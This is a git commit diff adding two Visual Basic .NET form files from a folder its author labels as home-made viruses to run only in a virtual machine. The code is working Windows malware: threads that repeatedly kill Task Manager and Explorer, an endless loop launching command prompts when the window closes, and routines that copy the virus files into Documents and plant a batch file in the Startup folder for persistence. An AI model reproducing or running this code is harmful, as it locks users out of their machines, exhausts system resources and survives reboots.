0b19ad8505d9f1a403ce0f6640573adc26499f40
bill-zhanxg <76557923+bill-zhanxg@users.noreply.github.com>
2021-04-18 14:23:02 +1000

    Source

---
+++ Source Code/Virus made by myyself (Only Open In VM!!!)/Virus 2 (Only Work With Virus)/Virus 2 (Only Work With Virus)/Form1.vb
@@ -0,0 +1,47 @@
+﻿Public Class Form1
+    Sub task()
+        While True
+            For Each o As Process In Process.GetProcessesByName("taskmgr")
+                o.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Sub block()
+        While True
+            For Each p As Process In Process.GetProcessesByName("explorer")
+                p.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Sub explorer()
+        While True
+            Threading.Thread.Sleep(1000)
+            For Each l As Process In Process.GetProcessesByName("explorer")
+                l.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim u As New Threading.Thread(AddressOf explorer)
+        u.Start()
+    End Sub
+
+    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
+
+    End Sub
+
+    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        Dim t As New Threading.Thread(AddressOf block)
+        Dim z As New Threading.Thread(AddressOf task)
+        t.Start()
+        z.Start()
+        Do
+            Process.Start("cmd")
+        Loop
+    End Sub
+End Class
---
+++ Source Code/Virus made by myyself (Only Open In VM!!!)/Virus 3 (Only Work With Virus)/Virus 3 (Only Work With Virus)/Form1.vb
@@ -0,0 +1,86 @@
+﻿Imports System.IO
+Public Class Form1
+    Sub task()
+        While True
+            For Each y As Process In Process.GetProcessesByName("taskmgr")
+                y.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+
+    Sub block()
+        While True
+            For Each p As Process In Process.GetProcessesByName("explorer")
+                p.Kill()
+            Next
+            Threading.Thread.Sleep(100)
+        End While
+    End Sub
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+line1:
+        Dim Files As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).exe"
+        Dim Files1 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).dll"
+        Dim FIles2 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).runtimeconfig.json"
+        Dim FIles3 As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Only Work With Virus (Only Open In VM!!!).bat"
+        Dim next1 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).exe"
+        Dim next2 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).dll"
+        Dim next3 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).runtimeconfig.json"
+        Dim other1 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).exe"
+        Dim other2 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).dll"
+        Dim other3 As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).runtimeconfig.json"
+
+        If File.Exists(Files) Then
+        Else
+            FileCopy("Virus (Only Open In VM!!!).exe", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).exe")
+        End If
+        If File.Exists(Files1) Then
+        Else
+            FileCopy("Virus (Only Open In VM!!!).dll", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).dll")
+        End If
+        If File.Exists(FIles2) Then
+        Else
+            FileCopy("Virus (Only Open In VM!!!).runtimeconfig.json", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus (Only Open In VM!!!).runtimeconfig.json")
+        End If
+        If File.Exists(FIles3) Then
+        Else
+            FileCopy("Only Work With Virus (Only Open In VM!!!).bat", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Only Work With Virus (Only Open In VM!!!).bat")
+        End If
+        If File.Exists(next1) Then
+        Else
+            FileCopy("Virus 3 (Only Work With Virus).exe", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).exe")
+        End If
+        If File.Exists(next2) Then
+        Else
+            FileCopy("Virus 3 (Only Work With Virus).dll", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).dll")
+        End If
+        If File.Exists(next3) Then
+        Else
+            FileCopy("Virus 3 (Only Work With Virus).runtimeconfig.json", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 3 (Only Work With Virus).runtimeconfig.json")
+        End If
+        If File.Exists(other1) Then
+        Else
+            FileCopy("Virus 2 (Only Work With Virus).exe", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).exe")
+        End If
+        If File.Exists(other2) Then
+        Else
+            FileCopy("Virus 2 (Only Work With Virus).dll", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).dll")
+        End If
+        If File.Exists(other3) Then
+        Else
+            FileCopy("Virus 2 (Only Work With Virus).runtimeconfig.json", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) & "\Virus 2 (Only Work With Virus).runtimeconfig.json")
+        End If
+        Threading.Thread.Sleep(500)
+        GoTo line1
+    End Sub
+
+    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        Dim t As New Threading.Thread(AddressOf block)
+        Dim q As New Threading.Thread(AddressOf task)
+        t.Start()
+        q.Start()
+        Do
+            Process.Start("cmd")
+        Loop
+    End Sub
+End Class
